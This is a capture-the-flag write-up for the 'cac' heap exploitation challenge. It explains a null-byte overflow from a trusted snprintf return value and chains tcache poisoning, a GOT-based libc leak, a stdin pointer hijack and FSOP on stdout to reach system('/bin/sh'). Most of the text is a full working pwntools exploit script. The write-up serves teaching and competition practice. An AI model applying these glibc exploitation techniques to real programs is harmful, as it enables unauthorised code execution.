# CAC

*Author: Carixo*

---

## 1  Challenge Recap

`cac` is a heap pwn challenge. We are given a tiny *CAC Airlines* self-service terminal where we can add booking, complaints, etc. We have the following structs:

```c
typedef struct {
    char* name;         /* Your name           */ 
    char* reference;    /* Booking reference   */
    char* flight;       /* Flight number       */
    bool checked_in;    /* Is user checked in  */
} Booking;

typedef struct {
    Booking* related_booking;           /* Pointer to related booking      */
    char complaint[COMPLAINT_SIZE];     /* Actual complaint (256 bytes)    */
} Complaint;
```
GOT is not writable and PIE is enabled (but it has no effect).

Everything is driven by a 7-item menu:

|  | Action                | What it does                                                                                                                                                                                                 |
| -- | ------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1  | **Add Booking** | Creates a new `Booking` and stores it in the `bookings[]`.array. If the flight number is invalid, the chunks are freed.                                                       |
| 2  | **Check in**              | Reads an 8-byte reference and, if found, changes `booking->checked_in = true`.                                                                                                                                         |
| 3  | **Booking info**          | Reads a reference and prints every field of the matching `Booking` with `printf`.                                                                                                                                    |
| 4  | **Customer complaint**    | Allocates a `Complaint`, stores a pointer to the related booking, then copies text into a temporary 512-byte buffer and finally into `complaint[256]` using `snprintf`. Pointer is pushed into `complaints[]`. |
| 5  | **Edit complaint**        | Looks up a complaint by numeric ID, then repeats the same copy routine into the existing 256-byte buffer.                                                                                                            |
| 6  | **Book flight**           | Auto-generates the reference/flight fields, asks only for the passenger name. Otherwise identical to option 1.                                                                                   |
| 7  | **Exit**                  | Prints a goodbye message, cleans up the heap and terminates.                                                                                                                                        |

On start-up the binary gifts the user the absolute address of `book_flight` which defeats the PIE protection:

```c
printf("As a welcome gift, you will receive a free pointer: %p\n", &book_flight);
```


---

## 2  Vulnerabilities
1. **Heap null-byte overflow in `customer_complaint` and `edit_complaint`** - After copying the user string with `snprintf(dst, 256, "%s - Complaint ID: %d", …)`, the code trusts the return value `len` and does `dst[len] = '\0';`. When the formatted output is truncated (anything > 255 bytes), `len > 255`, so the final write lands **out-of-bounds**.


---
## 2  Exploit Strategy — clean version

1. **Bypass PIE**
   The program prints the absolute address of `book_flight` at start-up.
   Subtracting the known offset of that function yields the ELF base.

2. **Prepare the heap – leak the heap base**

   * Create one booking, then several complaints, then another booking.
   * Arrange things so the second booking's allocation lands at an address ending in `…00`.
   * Use the null-byte overflow in `edit_complaint` to flip the *last* byte of that booking's `flight` pointer: the pointer now points into the heap but remains printable.
   * Call `booking_info` and `printf` prints the pointer and we derive the heap base.

3. **Tcache poisoning set-up - aim for a libc leak**

   * Set up the heap so that a size 0x20 booking chunk is freed (supply an invalid flight number).
   * With the overflow, alter one byte of the freed chunk's safe-linked forward pointer so that, after remangling, the next allocation will fall *inside* a complaint buffer.
   * This requires some arithmetic and may need a few retries to satisfy glibc's alignment checks.
   * At the computed address we pre-write a dummy size = 0x21 so that the allocator thinks this is a legitimate 0x20-byte chunk when freeing it again.

4. **Leak the libc base**

   * Allocate through `add_booking` with an invalid flight number; the chunk now overlaps a complaint.
   * Overwrite the *mangled* forward-pointer that lives in that buffer so it resolves to the `name` pointer of an already-existing booking (let's call it *Booking L*).Because we cannot use null bytes `\0` directly with `edit_complaint` or `add_complaint` because of the `snprintf`, we first write the non-zero bytes and then fix the required zeros with the null-byte overflow from a second, adjacent complaint.
   * Make one more booking through `add_booking`. The `name` chunk for the booking is now allocated on top of `Booking L->name`. We supply eight raw bytes as the "passenger name": `p64(elf.got['puts'])`. In other words, we overwrite the `name` pointer so it now points to `puts@GOT`.
   * Call `booking_info` for *Booking L*: the "Name:" line is printed with `%s`, so `printf` treats the GOT entry as a C-string and leaks the real address of `puts` in libc. Subtracting the static offset yields the **libc base**.

5. **Hijack `stdin` with a fake `_IO_FILE` structure**

   * Build a fake `FILE` object (`stdin_fake`) inside a complaint buffer. Fill everything with `0x21`, then zero the mandatory bytes via the overflow primitive.
   * Poison another tcache entry (the `name` chunk) so that the next allocation lands on the global `stdin` pointer in `.bss`, overwriting it with the address of `stdin_fake`.
   * The fake `FILE` object makes it so that the data we write in `stdin` (`fread`) will be copied to `_IO_2_1_stdout_` as well. 

6. **FSOP on `stdout` → `system("/bin/sh")`**

   * Craft a second fake `_IO_FILE` (`fake_stdout`).


   * Call `check_in` and send the raw bytes of `fake_stdout`. Because `stdin` already points to `stdin_fake`, this `fread` writes the payload over the real `_IO_2_1_stdout_` object in libc.

   * The later `puts` will execute `system("/bin/sh")`.


---

## 3. Full Exploit Script

```py
#!/usr/bin/env python3

from dataclasses import dataclass, field
from pwn import *

host = args.HOST or 'localhost'
port = int(args.PORT or 2727)
ssl = args.SSL or False


binary = 'cac_patched'

gdbscript = '''

    c
'''

context.binary = elf = ELF(binary)
context.terminal = ['tmux', 'splitw', '-h']

if os.path.isfile("./libc.so.6"): libc = ELF('./libc.so.6', checksec=False)


# utils
u64 = lambda d: struct.unpack("<Q", d.ljust(8, b"\0"))[0]
u32 = lambda d: struct.unpack("<I", d.ljust(4, b"\0"))[0]
u16 = lambda d: struct.unpack("<H", d.ljust(2, b"\0"))[0]

# credits to spwn by @chino
ru         = lambda *x, **y: p.recvuntil(*x, **y, drop=True, timeout=1)
rl         = lambda *x, **y: p.recvline(*x, **y, keepends=False)
rc         = lambda *x, **y: p.recv(*x, **y)
sla        = lambda *x, **y: p.sendlineafter(*x, **y, timeout=1)
sa         = lambda *x, **y: p.sendafter(*x, **y)
sl         = lambda *x, **y: p.sendline(*x, **y)
sn         = lambda *x, **y: p.send(*x, **y)
logbase    = lambda: log.info("libc base = %#x" % libc.address)
logleak    = lambda name, val: log.info(name+" = %#x" % val)
one_gadget = lambda: [int(i) + libc.address for i in subprocess.check_output(['one_gadget', '--raw', '-l1', libc.path]).decode().split(' ')]

# exit_handler stuff
fs_decrypt = lambda addr, key: ror(addr, 0x11) ^ key
fs_encrypt = lambda addr, key: rol(addr ^ key, 0x11)


# heap stuff
prot_ptr = lambda pos, ptr: (pos >> 12) ^ ptr
def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(host, port, ssl=ssl)
    else:
        return process([elf.path] + argv, *a, **kw)




def add_booking(reference, flight, name=None):
    sla(b'> ', b'1')
    sla(b'> ', reference) 
    sla(b'> ', flight)
    if name:    
        sla(b'> ', name)     

def check_in(reference):
    sla(b'> ', b'2')
    sla(b'> ', reference)

def booking_info(reference):
    sla(b'> ', b'3')
    sla(b'> ', reference)
    if b"not found" in rl():
        return None
    ru("Reference: ")
    ref = rl()
    ru("Name: ")
    name = rl()
    ru("Flight: ")
    flight = rl()
    return ref, name, flight

def customer_complaint(reference, complaint):
    sla(b'> ', b'4')
    sla(b'> ', reference)
    sla(b'> ', complaint)
    ru("complaint ID: ")
    return int(ru("."))

def edit_complaint(complaint_id, new_complaint):
    sla(b'> ', b'5')
    sla(b'>', str(complaint_id).encode())
    sla(b'> ', new_complaint)

def book_flight(name):
    sla(b'> ', b'6')
    sla(b'> ', name)
    ru("Reference: ")
    return rl()

def exit_():
    sla(b'> ', b'8')


def null_byte(c_id, offset, byte=b"\x21"):
    edit_complaint(str(c_id), byte*(offset - len(f" - Complaint ID: {c_id}\0")))

@dataclass
class Exploit:
    p: tube
    libc : ELF = field(default_factory=lambda: libc)
    elf : ELF = field(default_factory=lambda: context.binary)

    heap_base : int = 0

    def log_state(self) -> None:
        logleak("ELF base", self.elf.address)
        logleak("heap base", self.heap_base)
        logleak("libc base", self.libc.address)


    def run(self):
        while True:
            try:
                self.leak_elf()
                self.leak_heap()
                self.leak_libc()
                self.log_state()
                self.overwrite_stdin()
                self.overwrite_stdout_shell()
                break
            except Exception as e:
                log.failure(f"[attempt failed] {e!s}")
                self.p.close()
                self.p = start()
                global p
                p = self.p
                self.__dict__.update(Exploit(self.p).__dict__)


    def leak_elf(self):
        # get ELF base
        self.elf.address = 0
        ru("free pointer: ")
        self.elf.address = int(rl(), 16) - self.elf.sym['book_flight']
    
    def leak_heap(self):
        # set up heap for exploitation
        self.ref = book_flight(b'NOOB')
        self.cc_dummy_id1 = customer_complaint(self.ref, b'cc_dummy_id1')
        self.cc_dummy_id2 = customer_complaint(self.ref, b'cc_dummy_id2')
        self.cc_id1 = customer_complaint(self.ref, b'cc_id1')
        self.cc_id2 = customer_complaint(self.ref, b'cc_id2')
        book_flight(b'NOOB2')
        self.b_id = book_flight(b'NOOB3')
        
        # overwrite nullbyte so it points to heap address and leak
        null_byte(self.cc_id2, 424, b"C")
        self.heap_base = u64(booking_info(self.b_id)[2]) - 0x870

    def leak_libc(self):
        self.libc.address = 0
        # set up heap
        cc_id3 = customer_complaint(self.ref, b"cc_id3")
        cc_id4 = customer_complaint(self.ref, b"cc_id4")
        add_booking(b"A"*8, b"A"*8)
        target = self.heap_base+0xb00
        pnt = prot_ptr(target, self.heap_base + 0xae0)
        
        # check if the alignment is correct
        if pnt & 0xf:
            raise RuntimeError("pnt misaligned (leak_libc) - restarting")
        new_pnt = pnt & 0xffffffffffffff00
        new_pos_rel_id4 = prot_ptr(target, new_pnt)

        # check if the chunk will be allocated in the complaint chunk
        if new_pos_rel_id4 & 0xfff > 0xa90:
            raise RuntimeError("chunk placement wrong (leak_libc) - restarting")
        
        target_write = self.heap_base + 0x810
        self.cc_dummy_id1_addr = self.heap_base + 0x338
        self.cc_dummy_id2_addr = self.heap_base + 0x448

        self.cc_id3_addr = self.heap_base + 0x898
        self.cc_id4_addr = self.heap_base + 0x9a8

        # set up the metadata for tcache so it doesnt get angry when freeing
        null_byte(cc_id4, 344)
        offset = (new_pos_rel_id4 - 8) - self.cc_id3_addr + 1

        for i in range(7):
            null_byte(cc_id3, offset+i)

        add_booking(b"A"*8, b"CA128")

        # gotta set up the tcache pointer to point to the new chunk that then points to GOT
        pad = new_pos_rel_id4 - self.cc_id4_addr
        dummy_new_pos = self.cc_dummy_id2_addr + pad
        edit_complaint(cc_id4, b"A"*pad + p64(prot_ptr(new_pos_rel_id4, dummy_new_pos)))

        null_byte(cc_id3, (new_pos_rel_id4+7)-self.cc_id3_addr)
        null_byte(cc_id3, (new_pos_rel_id4+6)-self.cc_id3_addr)

        edit_complaint(self.cc_dummy_id2, b"A"*pad + p64(prot_ptr(dummy_new_pos, target_write)))

        null_byte(self.cc_dummy_id1, (dummy_new_pos+7)-self.cc_dummy_id1_addr)
        null_byte(self.cc_dummy_id1, (dummy_new_pos+6)-self.cc_dummy_id1_addr)

        add_booking(b"A"*8, b"CC123", p64(self.elf.got['puts']))

        libc.address = u64(booking_info(self.b_id)[2]) - self.libc.sym.puts

        if libc.address & 0xfff != 0:
            raise RuntimeError("libc address misaligned (leak_libc) - restarting")

    def overwrite_stdin(self):
        # set up heap for new overwrite
        cc_id5 = customer_complaint(self.ref, b'SHIT')
        cc_id6 = customer_complaint(self.ref, b'SHIT')

        add_booking(b"A"*8, b"A"*8)


        target = self.heap_base+0xdd0
        pnt = prot_ptr(target, self.heap_base + 0xdb0)
        if pnt & 0xf:
            raise RuntimeError("pnt misaligned (overwrite_stdin) - restarting")
        
        new_pnt = pnt & 0xffffffffffffff00
        new_pos_rel_id6 = prot_ptr(target, new_pnt)
        # again, make sure the new chunk is malloced into the complaint
        if new_pos_rel_id6 & 0xfff > 0xd40:
            raise RuntimeError("chunk placement wrong (overwrite_stdin) - restarting")

        wide_data = libc.address + 2111456
        lock = libc.address + 2119440
        stdin_fake = FileStructure(0)
        stdin_fake.flags = 0x3b01010101010101
        stdin_fake._IO_read_base = 0
        stdin_fake._IO_read_ptr = 0
        stdin_fake._IO_buf_base = libc.sym._IO_2_1_stdout_ 
        stdin_fake._IO_buf_end = libc.sym._IO_2_1_stdout_ + 0x200
        stdin_fake.fileno = 0
        stdin_fake._codecvt = self.heap_base + 0x2a0
        stdin_fake._wide_data = wide_data
        stdin_fake._lock= lock
        stdin_fake.unknown2=p64(0)*2+p64(libc.sym['_IO_2_1_stdin_']+0x20)+p64(0)*3+p64(libc.sym['_IO_file_jumps'])


        # write the fake filestruct in the complaint chunk
        edit_complaint(self.cc_dummy_id2, bytes(stdin_fake).replace(b"\x00", b"\x21"))
        null_locs = [i for i, j in enumerate(bytes(stdin_fake)) if j == 0]
        for i in null_locs:
            null_byte(self.cc_dummy_id1, (self.cc_dummy_id2_addr-self.cc_dummy_id1_addr)+i)


        overwrite_target = elf.address + 20528 # stdin pointer in the binary
        payload = p64(self.cc_dummy_id2_addr) # address of the fake struct


        cc_id5_addr = self.heap_base + 0xb48
        cc_id6_addr = self.heap_base + 0xc58

        # overwrite the stdin pointer in bss to point to the fake struct
        null_byte(cc_id6, 376)
        offset = (new_pos_rel_id6 - 8) - cc_id5_addr + 1
        for i in range(7):
            null_byte(cc_id5, offset+i)

        pad = new_pos_rel_id6 - cc_id6_addr

        edit_complaint(cc_id6, b"\x21"*pad + p64(prot_ptr(new_pos_rel_id6, overwrite_target)))
        for i in range(7):
            null_byte(cc_id5, offset+i)
       
        null_byte(cc_id5, (new_pos_rel_id6+7)-cc_id5_addr)
        null_byte(cc_id5, (new_pos_rel_id6+6)-cc_id5_addr)

        add_booking(b"A"*8, b"CC123", payload)

    def overwrite_stdout_shell(self):
        lock = libc.address + 2119440
        stdout_lock = lock
        stdout = libc.sym._IO_2_1_stdout_
        fake_vtable = libc.sym._IO_wfile_jumps - 0x18
        gadget = libc.address + 0x00000000001724f0

        fake_stdout = FileStructure(0)
        fake_stdout.flags = 0x3b01010101010101
        fake_stdout._IO_read_end = libc.sym.system  
        fake_stdout._IO_save_base = gadget
        fake_stdout._IO_write_end = u64(b'/bin/sh')  
        fake_stdout._lock = stdout_lock
        fake_stdout._codecvt = stdout + 0xb8
        fake_stdout._wide_data = stdout + 0x200   
        fake_stdout.unknown2 = p64(0)*2 + p64(stdout + 0x20) + p64(0)*3 + p64(fake_vtable)

        # call check_in since it calls puts after the fread and send in the fake stdout struct
        check_in(bytes(fake_stdout))

p = start()
exploit = Exploit(p)
exploit.run()
p.interactive()
```